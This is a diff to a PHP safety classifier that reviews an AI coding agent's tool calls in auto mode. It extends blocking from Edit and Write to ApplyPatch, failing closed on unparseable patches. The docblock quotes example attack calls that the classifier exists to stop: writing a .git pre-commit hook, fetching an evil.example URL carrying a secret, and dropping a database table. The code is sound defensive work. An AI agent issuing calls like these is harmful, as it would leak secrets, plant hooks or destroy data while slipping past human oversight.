@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace SugarCraft\Crush\Permissions;
 
 use SugarCraft\Crush\ToolCall;
+use SugarCraft\Crush\Tools\Edit\PatchParser;
 
 /**
  * SafetyClassifier reviews each tool call in Auto mode against a fixed
@@ -13,7 +14,7 @@ use SugarCraft\Crush\ToolCall;
  * categories below). Returns the category name if blocked, null if the action
  * is safe to auto-execute.
  *
- * THREE TOOLS ARE CLASSIFIED, each by the argument that carries its risk
+ * FIVE TOOLS ARE CLASSIFIED, each by the argument that carries its risk
  * (audit F-P3(b); before it only `Bash` was, so under `auto`
  * `Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
  * `mcp__db__drop_table` were all Allow):
@@ -23,7 +24,9 @@ use SugarCraft\Crush\ToolCall;
  *   under `.git`, `.sugar-crush` or `.mcp.json` is
  *   {@see CATEGORY_PROTECTED_PATH_WRITE}, and one that is not provably inside
  *   the project root — absolute with no root to compare, escaping, or simply
- *   absent — is {@see CATEGORY_OUTSIDE_ROOT_WRITE};
+ *   absent — is {@see CATEGORY_OUTSIDE_ROOT_WRITE}; `ApplyPatch` the same way
+ *   over every path its patch touches ({@see patchScope()}), the worst
+ *   deciding;
  * - `WebFetch` by what its URL carries, through {@see FetchTarget}: a query
  *   string or userinfo is data sent to a host the model chose, so it is
  *   `external-endpoint`, the same category a `curl -d` is. An unparseable URL
@@ -331,25 +334,60 @@ final class SafetyClassifier
      * @param string|null $projectRoot the root the write tools resolve a
      *        relative path against; see {@see WritePathScope::of()} for what
      *        changes without one (only a relative, lexically contained target
-     *        is inside). Only `Edit`/`Write` read it.
+     *        is inside). Only `Edit`/`Write`/`ApplyPatch` read it.
      */
     public function classify(ToolCall $call, ?string $projectRoot = null): ?string
     {
         return match ($call->name) {
             'Bash' => $this->classifyBash($call),
             'Edit', 'Write' => $this->classifyWrite($call, $projectRoot),
+            'ApplyPatch' => self::scopeCategory(self::patchScope($call, $projectRoot)),
             'WebFetch' => $this->classifyFetch($call),
             default => null,
         };
     }
 
-    private function classifyWrite(ToolCall $call, ?string $projectRoot): ?string
+    /**
+     * The worst {@see WritePathScope} among every path an `ApplyPatch` call
+     * touches (roadmap 3.I-3): OUTSIDE over PROTECTED over INSIDE. A patch
+     * that does not parse names no provable path, so it is OUTSIDE — fail
+     * closed, as an absent `file_path` is for `Edit`. Public because
+     * `accept-edits` grants a patch on the same answer
+     * ({@see PermissionGate}).
+     */
+    public static function patchScope(ToolCall $call, ?string $projectRoot): string
     {
-        return match (WritePathScope::of($call->arguments['file_path'] ?? null, $projectRoot)) {
+        $paths = PatchParser::paths($call->arguments['patch'] ?? null);
+        if ($paths === null || $paths === []) {
+            return WritePathScope::OUTSIDE;
+        }
+
+        $worst = WritePathScope::INSIDE;
+        foreach ($paths as $path) {
+            $scope = WritePathScope::of($path, $projectRoot);
+            if ($scope === WritePathScope::OUTSIDE) {
+                return WritePathScope::OUTSIDE;
+            }
+            if ($scope === WritePathScope::PROTECTED) {
+                $worst = WritePathScope::PROTECTED;
+            }
+        }
+
+        return $worst;
+    }
+
+    private static function scopeCategory(string $scope): ?string
+    {
+        return match ($scope) {
             WritePathScope::INSIDE => null,
             WritePathScope::PROTECTED => self::CATEGORY_PROTECTED_PATH_WRITE,
             default => self::CATEGORY_OUTSIDE_ROOT_WRITE,
         };
+    }
+
+    private function classifyWrite(ToolCall $call, ?string $projectRoot): ?string
+    {
+        return self::scopeCategory(WritePathScope::of($call->arguments['file_path'] ?? null, $projectRoot));
     }
 
     private function classifyFetch(ToolCall $call): ?string
